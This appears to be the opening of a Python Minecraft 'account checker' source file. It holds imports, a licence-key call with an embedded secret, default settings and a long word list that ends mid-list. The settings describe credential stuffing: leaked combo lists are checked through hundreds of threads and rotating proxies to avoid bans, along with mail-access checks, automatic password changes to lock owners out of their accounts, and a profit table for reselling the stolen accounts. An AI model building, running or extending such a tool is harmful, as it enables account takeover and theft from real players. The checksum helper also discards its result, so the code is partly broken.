# -*- coding: utf-8 -*-
import os
import sys
from concurrent.futures import ThreadPoolExecutor
from configparser import RawConfigParser
from ctypes import windll
from json import JSONDecodeError
from multiprocessing.dummy import Pool as ThreadPool
from os import mkdir, path, system
from queue import Queue
from random import choice, randint, shuffle
from re import compile as compilee
from string import ascii_lowercase, ascii_uppercase, digits
from time import sleep, strftime, gmtime
import urllib3
from colorama import init, Fore
from fake_useragent import UserAgent
from pypresence import Presence
from requests import get
from urllib3 import disable_warnings
from urllib3.connectionpool import SocketError, SSLError, MaxRetryError, ProxyError
from yaml import full_load
from keyauth import api
import hashlib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def getchecksum():
    path = os.path.basename(__file__)
    if not os.path.exists(path):
        path = path[:-2] + "exe"
    md5_hash = hashlib.md5()
    a_file = open(path,"rb")
    content = a_file.read()
    md5_hash.update(content)
    digest = md5_hash.hexdigest()
    return

keyauthapp = api("Minecraft","xWlEJY8J3g","3c025eecce8ad798264e64e0d9cc58dc5098316008c303113b84134c48471498","1.0", hash_to_check = getchecksum())

class Config:
    if not path.exists('combos'):
        mkdir('combos')
    if not path.exists('proxies'):
        mkdir('proxies')
    if not path.exists('config/config.txt'):
        if not path.exists('config'):
            mkdir('config')
        with open('config/config.txt', 'w') as w:
            r = '''[Password Configs]
                                numbers = true
                                lower_letters = false
                                upper_letters = false
                                min_length = 2
                                max_length = 4
                                '''
            r = r.replace('  ', '')
            w.write(r)
    config = RawConfigParser()
    config.read_file(open(r'config/config.txt'))
    min_l = config.get('Password Configs', 'min_length')
    max_l = config.get('Password Configs', 'max_length')
    if max_l.isnumeric():
        pass
    else:
        config.set('Password Configs', 'max_length', '4')
    if min_l.isnumeric():
        pass
    else:
        config.set('Password Configs', 'min_length', '2')

    lists1 = ['numbers', 'lower_letters', 'upper_letters']
    for item1 in lists1:
        try:
            config.getboolean('Password Configs', item1)
        except ValueError:
            config.set('Password Configs', item1, 'true')
            with open('config/config.txt', 'w') as file:
                config.write(file)

    numbers = config.getboolean('Password Configs', 'numbers')
    lower_letters = config.getboolean('Password Configs', 'lower_letters')
    upper_letters = config.getboolean('Password Configs', 'upper_letters')

    if all(x is False for x in (numbers, lower_letters, upper_letters)):
        config.set('Password Configs', 'numbers', 'true')
    with open('config/config.txt', 'w') as file:
        config.write(file)
    types = []
    if numbers is True:
        types = types + list(digits)
    if lower_letters is True:
        types = types + list(ascii_lowercase)
    if upper_letters is True:
        types = types + list(ascii_uppercase)

    lenth = randint(int(min_l), int(max_l))
    if min_l == min_l:
        lenth = min_l


init()
default_values = '''checker:       

  # Autologin
  autologin: false
  username: 
  password: 
  # CHECKING SETTINGS:
  # number of times to check an account recommended to leave this on 3
  retries: 3


  # Print failed lines in the console if using non cui mode
  Print_fail: true

  # the time it gives for a proxy to respond before moving on to the next if you have payed proxies put this on 1000-3000
  # if not leave it on 5000-10000
  timeout: 6000

  # the more threads the faster checking but more of a performance impact if your running this while being afk and you have a good pc you can set this to anything up to 800
  threads: 300

  # check if an account is mail access
  mail_access: true

  # turn this off if you dont want ranked accounts saved with the others
  save_rankedtypes: true

  # saves the non valid accounts in a file
  save_bad: false

  # prints errors in the console
  # leave this off unless something is going wrong
  debugging: false

 # Profit calculator for if you have a shop or sell your accounts:
  profit:
                profit: true
                Combolist price: 0
                NFA: 1
                SFA: 7
                MFA: 100
                Mojang Cape: 1000
                Mineplex Ranked: 50
                Mineplex Leveled: 10
                Optifine Cape: 250
                Labymod Cape: 100
                Liquidbounce Cape: 50
                Og/3letter nick: 500
                Hypixel Ranked: 50
                Hypixel Leveled (25+): 10
                Velt Ranked: 500
                Hive Ranked: 50

  # CAPES:
  capes:
                optifine: true
                labymod:  true
                minecon:  true
                liquidbounce: true


  # RANKS:
  rank:
                hypixel:  true
                mineplex: true
                hivemc: true
                veltpvp: true
                wynncraft: true

  # minimum UHC stats to be saved in a file 
  uhc:
                check_uhc: true
                uhc_coins: 1000
                uhc_wins: 5

  # minimum Skywars stats to be saved in a file 
  skywars:
                check_skywars: true
                skywars_coins: 10000

  # minimum Bedwars stats to be saved in a file 
  bedwars:
                check_bedwars: true
                bwlevel: 50



 # levels to check for 
  level:
                hypixel: true
                hypixel_level: 10
                mineplex: true
                mineplex_level: 10

 # PROXY SETTINGS
 # (IMPORTANT) Set proxies to true if you are checking large combos HOWEVER if you are checking smaller combos (less than 75) feel free to set proxies to false this will check much faster and wont skip hits  but will get your ip banned if you check more than 75
  proxy:
                # Whether to use proxies or not don't put false unless checking less than 75 combos
                proxy: true
                # Proxy type: |HTTP|SOCKS4|SOCKS5|
                proxy_type: 'SOCKS4'

                # use proxies to check for MA (mail access) leave this false unless your afraid your ip will get banned
                mailcheck_use_proxy: false

                proxy_api: false
                api_link: 'https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=10000&country=all'


 # PROXYCHECKER
  proxychecker:
                # The more threads the faster the checking but more of a peformance impact
                pc_threads: 400
                # Timeout Amount of time to give each proxy to respond
                pc_timeout: 10  
  passwordchanger:
                # auto change passwords for sfa when checking
                autochange: false
                #new pass
                #MUST CONTAIN: 1 lowercase, 1 uppercase, 1 number, 1 symbol, more than 8 long
                new_password: MinecraftHecker96!!

  RPC:
                # Set true if you want to flex bolt on people, this will only work with the discord APP not the webbrowser
                # It has a small impact on speed so set false if you just want the best speed of checking
                DiscordRPC: false

'''
ogname = '''abandon
ability
able
abortion
about
above
abroad
absence
absolute
absolutely
absorb
abstract
abuse
academic
accelerate
accent
accept
acceptable
acceptance
access
accessible
accident
accommodate
accompany
accomplish
accomplishment
according
account
accountability
accounting
accuracy
accurate
accurately
accusation
accuse
achieve
achievement
acid
acknowledge
acquire
acquisition
across
act
action
active
actively
activist
activity
actor
actress
actual
actually
adapt
add
added
addition
additional
address
adequate
adjust
adjustment
administer
administration
administrative
administrator
admire
admission
admit
adolescent
adopt
adoption
adult
advance
advanced
advantage
adventure
advertising
advice
advise
adviser
advocate
aesthetic
affair
affect
afford
afraid
african
african-american
after
afternoon
afterward
again
against
age
agency
agenda
agent
aggression
aggressive
ago
agree
agreement
agricultural
agriculture
ahead
aid
aide
aids
aim
air
aircraft
airline
airplane
airport
aisle
alarm
album
alcohol
alien
alike
alive
all
allegation
alleged
allegedly
alley
alliance
allow
ally
almost
alone
along
alongside
already
alright
also
alter
alternative
although
altogether
aluminum
always
amazing
ambassador
ambition
ambitious
amendment
american
amid
among
amount
analysis
analyst
analyze
ancestor
ancient
and
angel
anger
angle
angry
animal
ankle
anniversary
announce
announcement
annual
annually
anonymous
another
answer
anticipate
anxiety
anxious
any
anybody
anymore
anyone
anything
anyway
anywhere
apart
apartment
apologize
apology
apparent
apparently
appeal
appear
appearance
apple
application
apply
appoint
appointment
appreciate
appreciation
approach
appropriate
approval
approve
approximately
arab
architect
architecture
are
area
arena
argue
argument
arise
arm
armed
army
around
arrange
arrangement
array
arrest
arrival
arrive
arrow
art
article
articulate
artifact
artificial
artist
artistic
as
ash
asian
aside
ask
asleep
aspect
ass
assault
assemble
assembly
assert
assess
assessment
asset
assign
assignment
assist
assistance
assistant
associate
associated
association
assume
assumption
assure
astronomer
at
athlete
athletic
atmosphere
atom
atop
attach
attack
attempt
attend
attendance
attention
attitude
attorney
attract
attraction
attractive
attribute
auction
audience
aunt
author
authority
authorize
auto
automatic
automatically
automobile
autonomy
availability
available
average
avoid
await
awake
award
aware
awareness
away
awful
baby
back
background
backyard
bacteria
bad
badly
bag
bake
balance
balanced
ball
balloon
ballot
ban
banana
band
bank
banker
banking
bankruptcy
bar
bare
barely
barn
barrel
barrier
base
baseball
basement
basic
basically
basis
basket
basketball
bat
bath
bathroom
battery
battle
bay
be
beach
beam
bean
bear
beard
beast
beat
beautiful
beauty
because
become
bed
bedroom
bee
beef
been
beer
before
beg
began
begin
beginner
beginning
behalf
behave
behavior
behavioral
behind
being
belief
believe
bell
belly
belong
below
belt
bench
bend
beneath
benefit
beside
besides
best
bet
better
between
beyond
bias
bible
bicycle
bid
big
bike
bill
billion
bind
biography
biological
biology
bird
birth
birthday
bishop
bit
bite
bitter
black
blade
blame
blank
blanket
blast
blend
bless
blessing
blind
blink
block
blond
blood
bloody
blow
blue
board
boast
boat
body
boil
bold
bolt
bomb
bombing
bond
bone
bonus
book
boom
boost
boot
booth
border
boring
born
borrow
boss
both
bother
bottle
bottom
bought
bounce
boundary
bow
bowl
box
boy
boyfriend
brain
brake
branch
brand
brave
bread
break
breakfast
breast
breath
breathe
breathing
breeze
brick
bride
bridge
brief
briefly
bright
brilliant
bring
british
broad
broadcast
broke
broken
broker
bronze
brother
brought
brown
brush
brutal
bubble
buck
bucket
buddy
budget
bug
build
builder
building
bulb
bulk
bull
bullet
bunch
burden
bureau
burn
burning
burst
bury
bus
bush
business
businessman
busy
but
butt
butter
butterfly
button
buy
buyer
by
cab
cabin
cabinet
cable
cage
cake
calculate
calculation
calendar
call
calm
came
camera
camp
campaign
campus
can
canadian
cancel
cancer
candidate
candle
candy
canvas
cap
capability
capable
capacity
capital
captain
capture
car
carbohydrate
carbon
card
care
career
careful
carefully
cargo
carpet
carrier
carrot
carry
cart
cartoon
carve
case
cash
casino
cast
casual
casualty
cat
catalog
catch
category
catholic
cattle
caught
cause
cave
cease
ceiling
celebrate
celebration
celebrity
cell
cemetery
cent
center
central
century
ceo
ceremony
certain
certainly
chain
chair
chairman
challenge
chamber
champion
championship
chance
change
changing
channel
chaos
chapter
character
characteristic
characterize
charge
charity
charm
chart
charter
chase
cheap
cheat
check
cheek
cheer
cheese
chef
chemical
chemistry
chest
chew
chick
chicken
chief
child
childhood
children
chill
chin
chinese
chip
chocolate
choice
cholesterol
choose
chop
chord
christian
christianity
christmas
chronic
chunk
church
cigarette
circle
circuit
circumstance
cite
citizen
citizenship
city
civic
civil
civilian
civilization
claim
class
classic
classical
classify
classroom
clay
clean
clear
clearly
clerk
click
client
cliff
climate
climb
cling
clinic
clinical
clip
clock
close
closed
closely
closer
closest
closet
cloth
clothe
clothes
clothing
cloud
club
clue
cluster
coach
coal
coalition
coast
coastal
coat
cocaine
code
coffee
cognitive
coin
cold
collaboration
collapse
collar
colleague
collect
collection
collective
collector
college
colonial
colony
color
colorful
column
columnist
combat
combination
combine
combined
come
comedy
comfort
comfortable
coming
command
commander
comment
commercial
commission
commissioner
commit
commitment
committee
commodity
common
commonly
communicate
communication
community
companion
company
comparable
compare
comparison
compel
compelling
compensation
compete
competition
competitive
competitor
complain
complaint
complete
completely
complex
complexity
compliance
complicated
comply
component
compose
composition
compound
comprehensive
comprise
compromise
computer
concede
conceive
concentrate
concentration
concept
conception
concern
concerned
concerning
concert
conclude
conclusion
concrete
condemn
condition
conduct
conference
confess
confession
confidence
confident
confirm
conflict
confront
confrontation
confuse
confusion
congress
congressional
connect
connection
conscience
conscious
consciousness
consecutive
consensus
consent
consequence
consequently
conservation
conservative
consider
considerable
considerably
consideration
consist
consistent
consistently
consonant
conspiracy
constant
constantly
constitute
constitution
constitutional
constraint
construct
construction
consult
consultant
consume
consumer
consumption
contact
contain
container
contemplate
contemporary
contend
content
contest
context
continent
continue
continued
continuing
continuous
contract
contractor
contrast
contribute
contribution
contributor
control
controversial
controversy
convenience
convention
conventional
conversation
conversion
convert
convey
convict
conviction
convince
convinced
cook
cookie
cooking
cool
cooperate
cooperation
cooperative
coordinate
coordinator
cop
cope
copy
cord
core
corn
corner
corporate
corporation
correct
correctly
correlation
correspondent
corridor
corruption
cost
costly
costume
cottage
cotton
couch
could
council
counsel
counseling
counselor
count
counter
counterpart
country
county
coup
couple
courage
course
court
courtroom
cousin
cover
coverage
cow
crack
craft
crash
crawl
crazy
cream
crease
create
creation
creative
creativity
creature
credibility
credit
crew
crime
criminal
crisis
criteria
critic
critical
criticism
criticize
crop
cross
crowd
crowded
crucial
cruel
cruise
crush
cry
crystal
cuban
cue
cultural
culture
cup
cure
curiosity
curious
currency
current
currently
curriculum
curtain
curve
custody
custom
customer
cut
cute
cycle
dad
daily
dam
damage
damn
dance
dancer
dancing
danger
dangerous
dare
dark
darkness
data
database
date
daughter
dawn
day
dead
deadline
deadly
deal
dealer
dear
death
debate
debris
debt
debut
decade
decent
decide
decimal
decision
deck
declare
decline
decorate
decrease
dedicate
deem
deep
deeply
deer
defeat
defend
defendant
defender
defense
defensive
deficit
define
definitely
definition
degree
delay
deliberately
delicate
delight
deliver
delivery
demand
democracy
democrat
democratic
demographic
demonstrate
demonstration
denial
dense
density
deny
depart
department
departure
depend
dependent
depending
depict
deploy
deposit
depressed
depression
depth
deputy
derive
descend
describe
description
desert
deserve
design
designer
desire
desk
desperate
desperately
despite
dessert
destination
destroy
destruction
detail
detailed
detect
detective
determination
determine
devastating
develop
developer
developing
development
developmental
device
devil
devote
diabetes
diagnose
diagnosis
dialogue
diamond
diary
dictate
dictionary
did
die
diet
differ
difference
different
differently
difficult
difficulty
dig
digital
dignity
dilemma
dimension
diminish
dining
dinner
dip
diplomat
diplomatic
direct
direction
directly
director
dirt
dirty
disability
disabled
disagree
disappear
disappointed
disappointment
disaster
disc
discipline
disclose
discount
discourage
discourse
discover
discovery
discrimination
discuss
discussion
disease
dish
disk
dismiss
disorder
display
dispute
dissolve
distance
distant
distinct
distinction
distinctive
distinguish
distract
distribute
distribution
district
disturb
disturbing
diverse
diversity
divide
divine
division
divorce
dna
do
dock
doctor
doctrine
document
documentary
does
dog
doll
dollar
domain
domestic
dominant
dominate
donate
donation
done
donor
door
doorway
dose
dot
double
doubt
dough
down
downtown
dozen
draft
drag
drain
drama
dramatic
dramatically
draw
drawer
drawing
dream
dress
dried
drift
drill
drink
drinking
drive
driver
driveway
driving
drop
drown
drug
drum
drunk
dry
duck
due
dumb
dump
during
dust
dutch
duty
dying
dynamic
dynamics
e-mail
each
eager
ear
early
earn
earnings
earth
earthquake
ease
easily
east
eastern
easy
eat
eating
echo
ecological
economic
economically
economics
economist
economy
ecosystem
edge
edit
edition
editor
educate
education
educational
educator
effect
effective
effectively
effectiveness
efficiency
efficient
effort
egg
ego
eight
eighth
either
elaborate
elbow
elder
elderly
elect
election
electric
electrical
electricity
electronic
electronics
elegant
element
elementary
elephant
elevator
eleven
eligible
eliminate
elite
else
elsewhere
embarrassed
embrace
emerge
emergency
emerging
emission
emotion
emotional
emotionally
emphasis
emphasize
empire
employ
employee
employer
employment
empty
enable
enact
encounter
encourage
encouraging
end
endless
endorse
endure
enemy
energy
enforce
enforcement
engage
engagement
engine
engineer
engineering
english
english audio
enhance
enjoy
enormous
enough
enroll
ensure
enter
enterprise
entertainment
enthusiasm
entire
entirely
entitle
entity
entrance
entrepreneur
entry
envelope
environment
environmental
envision
epidemic
episode
equal
equality
equally
equate
equation
equip
equipment
equity
equivalent
era
error
escape
especially
essay
essence
essential
essentially
establish
establishment
estate
estimate
estimated
etc
ethical
ethics
ethnic
european
evaluate
evaluation
even
evening
event
eventually
ever
every
everybody
everyday
everyone
everything
everywhere
evidence
evident
evil
evolution
evolve
exact
exactly
exam
examination
examine
example
exceed
excellent
except
exception
excessive
exchange
excite
excited
excitement
exciting
exclude
exclusive
exclusively
excuse
execute
execution
executive
exercise
exhaust
exhibit
exhibition
exist
existence
existing
exit
exotic
expand
expansion
expect
expectation
expected
expedition
expense
expensive
experience
experienced
experiment
experimental
expert
expertise
explain
explanation
explicit
explode
exploit
exploration
explore
explosion
export
expose
exposure
express
expression
extend
extended
extension
extensive
extent
external
extra
extraordinary
extreme
extremely
eye
eyebrow
fabric
face
facilitate
facility
fact
factor
factory
faculty
fade
fail
failure
faint
fair
fairly
faith
fall
false
fame
familiar
family
famous
fan
fantastic
fantasy
far
fare
farm
farmer
fascinating
fashion
fast
faster
fat
fatal
fate
father
fatigue
fault
favor
favorable
favorite
fear
feather
feature
federal
fee
feed
feedback
feel
feeling
feet
fell
fellow
felt
female
feminist
fence
festival
fever
few
fewer
fiber
fiction
field
fierce
fifteen
fifth
fifty
fig
fight
fighter
fighting
figure
file
fill
film
filter
final
finally
finance
financial
find
finding
fine
finger
finish
fire
firm
firmly
first
fiscal
fish
fisherman
fishing
fist
fit
fitness
five
fix
fixed
flag
flame
flash
flat
flavor
flee
fleet
flesh
flexibility
flexible
flight
flip
float
flood
floor
flour
flow
flower
fluid
fly
flying
focus
fog
fold
folk
follow
following
food
fool
foot
football
for
forbid
force
forehead
foreign
foreigner
forest
forever
forget
forgive
fork
form
formal
format
formation
former
formerly
formula
forth
fortunately
fortune
forty
forum
forward
foster
found
foundation
founder
four
fourth
fraction
fragile
fragment
frame
framework
franchise
frankly
fraud
free
freedom
freely
freeze
french
frequency
frequent
frequently
fresh
freshman
friend
friendly
friendship
from
front
frontier
frown
frozen
fruit
frustrate
frustration
fucking
fuel
full
full-time
fully
fun
function
functional
fund
fundamental
funding
funeral
funny
fur
furniture
furthermore
future
gain
galaxy
gallery
game
gang
gap
garage
garbage
garden
garlic
gas
gasoline
gate
gather
gathering
gave
gay
gaze
gear
gender
gene
general
generally
generate
generation
generous
genetic
genius
genre
gentle
gentleman
gently
genuine
german
gesture
get
ghost
giant
gift
gifted
girl
girlfriend
give
given
glad
glance
glass
glimpse
global
globe
glory
glove
go
goal
goat
god
gold
golden
golf
gone
good
got
govern
government
governor
grab
grace
grade
gradually
graduate
graduation
grain
grand
grandchild
grandfather
grandmother
grandparent
grant
grape
grasp
grass
grateful
grave
gravity
gray
great
greatest
greatly
greek
green
greet
grew
grief
grin
grip
grocery
gross
ground
group
grow
growing
growth
guarantee
guard
guess
guest
guidance
guide
guideline
guilt
guilty
guitar
gun
gut
guy
gym
ha
habit
habitat
had
hair
half
halfway
hall
hallway
hand
handful
handle
handsome
hang
happen
happily
happiness
happy
harassment
hard
hardly
hardware
harm
harmony
harsh
harvest
has
hat
hate
haul
have
hay
hazard
he
head
headache
headline
headquarters
heal
health
healthy
hear
heard
hearing
heart
heat
heaven
heavily
heavy
heel
height
held
helicopter
hell
hello
helmet
help
helpful
hence
her
herb
here
heritage
hero
hers
herself
hesitate
hey
hi
hidden
hide
high
high-tech
highlight
highly
highway
hike
hill
him
himself
hint
hip
hire
his
hispanic
historian
historic
historical
historically
history
hit
hockey
hold
hole
holiday
holy
home
homeland
homeless
homework
honest
honestly
honey
honor
hook
hope
hopefully
horizon
hormone
horn
horrible
horror
horse
hospital
host
hostage
hostile
hot
hotel
hour
house
household
housing
how
however
hug
huge
huh
human
humanity
humor
hundred
hunger
hungry
hunt
hunter
hunting
hurricane
hurry
hurt
husband
hypothesis
ice
icon
idea
ideal
identical
identification
identify
identity
ideological
ideology
ie
if
ignore
ill
illegal
illness
illusion
illustrate
image
imagination
imagine
immediate
immediately
immigrant
immigration
immune
impact
implement
implementation
implication
imply
import
importance
important
importantly
impose
impossible
impress
impression
impressive
improve
improved
improvement
impulse
in
incentive
inch
incident
include
including
income
incorporate
increase
increased
increasing
increasingly
incredible
incredibly
indeed
independence
independent
index
indian
indicate
indication
indicator
indigenous
individual
industrial
industry
inevitable
inevitably
infant
infection
inflation
influence
influential
inform
informal
information
infrastructure
ingredient
inherent
inherit
initial
initially
initiate
initiative
injure
injury
inmate
inner
innocent
innovation
innovative
input
inquiry
insect
insert
inside
insight
insist
inspection
inspector
inspiration
inspire
install
installation
instance
instant
instantly
instead
instinct
institution
institutional
instruct
instruction
instructional
instructor
instrument
insurance
intact
integrate
integrated
integration
integrity
intellectual
intelligence
intelligent
intend
intense
intensity
intent
intention
interact
interaction
interest
interested
interesting
interfere
interior
internal
international
internet
interpret
interpretation
interrupt
interval
intervention
interview
intimate
into
introduce
introduction
invade
invasion
invent
invention
inventory
invest
investigate
investigation
investigator
investment
investor
invisible
invitation
invite
involve
involved
involvement
iraqi
irish
iron
ironically
irony
is
islam
islamic
island
isolate
isolated
isolation
israeli
issue
it
italian
item
its
itself
jacket
jail
japanese
jar
jaw
jazz
jeans
jet
jew
jewelry
jewish
job
join
joint
joke
journal
journalism
journalist
journey
joy
judge
judgment
judicial
juice
jump
jungle
junior
jurisdiction
juror
jury
just
justice
justify
keep
kept
key
kick
kid
kill
killer
killing
kind
king
kingdom
kiss
kit
kitchen
knee
kneel
knew
knife
knock
know
knowledge
known
korean
lab
label
labor
laboratory
lack
ladder
lady
lake
lamp
land
landing
landmark
landscape
lane
language
lap
large
largely
laser
last
late
lately
later
latin
latter
laugh
laughter
launch
laundry
law
lawmaker
lawn
lawsuit
lawyer
lay
layer
lazy
lead
leader
leadership
leading
leaf
league
lean
leap
learn
learning
least
leather
leave
lecture
led
left
leg
legacy
legal
legally
legend
legislation
legislative
legislator
legislature
legitimate
lemon
lend
length
lens
less
lesson
let
letter
level
liability
liberal
liberty
library
license
lid
lie
life
lifestyle
lifetime
lift
light
lighting
lightly
lightning
like
likelihood
likely
likewise
limb
limit
limitation
limited
line
link
lion
lip
liquid
list
listen
listener
literally
literary
literature
little
live
liver
living
load
loan
lobby
local
locate
location
lock
log
logic
logical
lone
lonely
long
long-term
longtime
look
loop
loose
lose
loss
lost
lot
lots
loud
love
lovely
lover
low
lower
loyal
loyalty
luck
lucky
lunch
lung
machine
mad
made
magazine
magic
magnet
magnetic
magnitude
mail
main
mainly
mainstream
maintain
maintenance
major
majority
make
maker
makeup
male
mall
man
manage
management
manager
managing
mandate
manipulate
manner
mansion
manual
manufacturer
manufacturing
many
map
marble
march
margin
marine
mark
marker
market
marketing
marketplace
marriage
married
marry
mask
mass
massive
master
match
mate
material
math
mathematics
matter
maximum
may
maybe
mayor
me
meal
mean
meaning
meaningful
meant
meantime
meanwhile
measure
measurement
meat
mechanic
mechanical
mechanism
medal
media
medical
medication
medicine
medium
meet
meeting
melody
melt
member
membership
memory
men
mental
mentally
mention
mentor
menu
merchant
mere
merely
merit
mess
message
metal
metaphor
meter
method
metropolitan
mexican
middle
middle-class
midnight
midst
might
migration
mild
mile
military
milk
mill
million
mind
mine
mineral
minimal
minimize
minimum
minister
ministry
minor
minority
minute
miracle
mirror
miss
missile
missing
mission
missionary
mistake
mix
mixed
mixture
mm-hmm
mobile
mode
model
moderate
modern
modest
modify
molecule
mom
moment
momentum
money
monitor
monkey
monster
month
monthly
monument
mood
moon
moral
more
moreover
morning
mortality
mortgage
most
mostly
mother
motion
motivate
motivation
motive
motor
mount
mountain
mouse
mouth
move
movement
movie
mr
mrs
ms
much
mud
multiple
multiply
municipal
murder
muscle
museum
mushroom
music
musical
musician
muslim
must
mutter
mutual
my
myself
mysterious
mystery
myth
nail
naked
name
narrative
narrow
nasty
nation
national
nationwide
native
natural
naturally
nature
naval
near
nearby
nearly
neat
necessarily
necessary
necessity
neck
need
needle
negative
negotiate
negotiation
neighbor
neighborhood
neighboring
neither
nerve
nervous
nest
net
network
neutral
never
nevertheless
new
newly
news
newspaper
next
nice
night
nightmare
nine
no
nobody
nod
noise
noisy
nomination
nominee
none
nonetheless
nonprofit
noon
nor
norm
normal
normally
north
northeast
northern
northwest
nose
not
note
notebook
nothing
notice
notion
noun
novel
now
nowhere
nuclear
number
numeral
numerous
nurse
nut
nutrient
oak
object
objection
objective
obligation
observation
observe
observer
obstacle
obtain
obvious
obviously
occasion
occasional
occasionally
occupation
occupy
occur
ocean
odd
odds
odor
of
off
offender
offense
offensive
offer
offering
office
officer
official
officially
often
oh
oil
ok
okay
old
old-fashioned
olympic
olympics
on
once
one
one-third
ongoing
onion
online
only
onto
open
opening
openly
opera
operate
operating
operation
operator
opinion
opponent
opportunity
oppose
opposed
opposite
opposition
opt
optimistic
option
or
oral
orange
orbit
order
ordinary
organ
organic
organism
organization
organizational
organize
organized
orientation
origin
original
originally
other
others
otherwise
ought
our
ours
ourselves
out
outcome
outdoor
outer
outfit
outlet
outline
output
outside
outsider
outstanding
oven
over
overall
overcome
overlook
overnight
oversee
overwhelm
overwhelming
owe
own
owner
ownership
oxygen
pace
pack
package
pad
page
pain
painful
paint
painter
painting
pair
palace
pale
palestinian
palm
pan
panel
panic
pant
paper
parade
paragraph
parent
parental
parish
park
parking
part
partial
partially
participant
participate
participation
particle
particular
particularly
partly
partner
partnership
party
pass
passage
passenger
passing
passion
past
pasta
pastor
pat
patch
patent
path
patience
patient
patrol
patron
pattern
pause
pay
payment
pc
peace
peaceful
peak
peanut
peasant
peel
peer
pen
penalty
pencil
pension
people
pepper
per
perceive
perceived
percentage
perception
perfect
perfectly
perform
performance
performer
perhaps
period
permanent
permission
permit
persian
persist
person
personal
personality
personally
personnel
perspective
persuade
pet
phase
phenomenon
philosophical
philosophy
phone
photo
photograph
photographer
photography
phrase
physical
physically
physician
physics
piano
pick
pickup
picture
pie
piece
pig
pile
pill
pillow
pilot
pin
pine
pink
pioneer
pipe
pistol
pit
pitch
pitcher
pizza
place
placement
plain
plaintiff
plan
plane
planet
planner
planning
plant
plastic
plate
platform
play
player
playoff
plea
plead
pleasant
please
pleased
pleasure
plenty
plot
plunge
plural
plus
pm
pocket
poem
poet
poetry
point
poke
pole
police
policeman
policy
political
politically
politician
politics
poll
pollution
pond
pool
poor
pop
popular
popularity
populate
population
porch
pork
port
portfolio
portion
portrait
portray
pose
position
positive
possess
possession
possibility
possible
possibly
post
poster
pot
potato
potential
potentially
pound
pour
poverty
powder
power
powerful
practical
practically
practice
practitioner
praise
pray
prayer
preach
precious
precise
precisely
predator
predict
prediction
prefer
preference
pregnancy
pregnant
preliminary
premise
premium
preparation
prepare
prescription
presence
present
presentation
preserve
presidency
president
presidential
press
pressure
presumably
pretend
pretty
prevail
prevent
prevention
previous
previously
price
pride
priest
primarily
primary
prime
principal
principle
print
prior
priority
prison
prisoner
privacy
private
privately
privilege
prize
pro
probable
probably
problem
procedure
proceed
process
processing
processor
proclaim
produce
producer
product
production
productive
productivity
profession
professional
professor
profile
profit
profound
program
programming
progress
progressive
prohibit
project
projection
prominent
promise
promising
promote
promotion
prompt
proof
proper
properly
property
proportion
proposal
propose
proposed
prosecution
prosecutor
prospect
protect
protection
protective
protein
protest
protocol
proud
prove
provide
provided
provider
province
provision
provoke
psychological
psychologist
psychology
public
publication
publicity
publicly
publish
publisher
pull
pulse
pump
punch
punish
punishment
purchase
pure
purple
purpose
purse
pursue
pursuit
push
put
puzzle
qualify
quality
quantity
quart
quarter
quarterback
queen
quest
question
questionnaire
quick
quickly
quiet
quietly
quit
quite
quote
quotient
rabbit
race
racial
racism
rack
radar
radiation
radical
radio
rage
rail
railroad
rain
raise
rally
ran
ranch
random
range
rank
rape
rapid
rapidly
rare
rarely
rat
rate
rather
rating
ratio
rational
raw
re
reach
react
reaction
read
reader
readily
reading
ready
real
realistic
reality
realize
really
realm
rear
reason
reasonable
rebel
rebuild
recall
receive
receiver
recent
recently
reception
recession
recipe
recipient
recognition
recognize
recommend
recommendation
record
recording
recover
recovery
recruit
red
reduce
reduction
refer
reference
reflect
reflection
reform
refrigerator
refuge
refugee
refuse
regain
regard
regarding
regardless
regime
region
regional
register
regret
regular
regularly
regulate
regulation
regulator
regulatory
rehabilitation
reinforce
reject
relate
related
relation
relationship
relative
relatively
relax
release
relevant
reliability
reliable
relief
relieve
religion
religious
reluctant
rely
remain
remaining
remark
remarkable
remember
remind
reminder
remote
removal
remove
render
rent
rental
repair
repeat
repeatedly
replace
replacement
reply
report
reportedly
reporter
reporting
represent
representation
representative
republic
republican
reputation
request
require
required
requirement
rescue
research
researcher
resemble
reservation
reserve
residence
resident
residential
resign
resist
resistance
resolution
resolve
resort
resource
respect
respectively
respond
respondent
response
responsibility
responsible
rest
restaurant
restore
restrict
restriction
user
resume
retail
retailer
retain
retire
retired
retirement
retreat
return
reveal
revelation
revenue
reverse
review
revolution
revolutionary
reward
rhetoric
rhythm
rib
ribbon
rice
rich
rid
ride
rider
ridge
ridiculous
rifle
right
rim
ring
riot
rip
rise
risk
risky
ritual
rival
river
road
robot
rock
rocket
rod
role
roll
rolling
roman
romance
romantic
roof
room
root
rope
rose
rough
roughly
round
route
routine
routinely
row
royal
rub
rubber
ruin
rule
ruling
rumor
run
runner
running
rural
rush
russian
sack
sacred
sacrifice
sad
safe
safely
safety
said
sail
sake
salad
salary
sale
sales
salmon
salt
same
sample
sanction
sand
sandwich
sat
satellite
satisfaction
satisfy
sauce
save
saving
saw
say
scale
scan
scandal
scare
scared
scary
scatter
scenario
scene
scent
schedule
scheme
scholar
scholarship
school
science
scientific
scientist
scope
score
scramble
scratch
scream
screen
screening
screw
script
sculpture
sea
seal
search
season
seat
second
secondary
secret
secretary
section
sector
secular
secure
security
see
seed
seek
seem
seemingly
segment
seize
seldom
select
selected
selection
self
self-esteem
sell
seller
seminar
senate
senator
send
senior
sensation
sense
sensitive
sensitivity
sensor
sent
sentence
sentiment
separate
separation
sequence
series
serious
seriously
servant
serve
service
serving
session
set
setting
settle
settlement
seven
seventh
several
severe
severely
sex
sexual
sexuality
sexually
sexy
shade
shadow
shake
shall
shallow
shame
shape
share
shared
shareholder
shark
sharp
sharply
she
shed
sheep
sheer
sheet
shelf
shell
shelter
shift
shine
ship
shirt
shit
shock
shoe
shoot
shooting
shop
shopping
shore
short
short-term
shortage
shortly
shorts
shot
should
shoulder
shout
shove
show
shower
shrimp
shrink
shrug
shut
shuttle
shy
sibling
sick
side
sidewalk
sigh
sight
sign
signal
signature
significance
significant
significantly
silence
silent
silk
silly
silver
similar
similarity
similarly
simple
simply
simultaneously
sin
since
sing
singer
single
sink
sir
sister
sit
site
situation
six
sixth
size
ski
skill
skilled
skin
skip
skirt
skull
sky
slam
slap
slave
slavery
sleep
sleeve
slice
slide
slight
slightly
slip
slope
slot
slow
slower
slowly
small
smart
smell
smile
smoke
smooth
snake
snap
sneak
snow
so
so-called
so-so
soak
soap
soar
soccer
social
socially
society
sock
sodium
sofa
soft
soften
softly
software
soil
solar
soldier
sole
solely
solid
solution
solve
some
somebody
someday
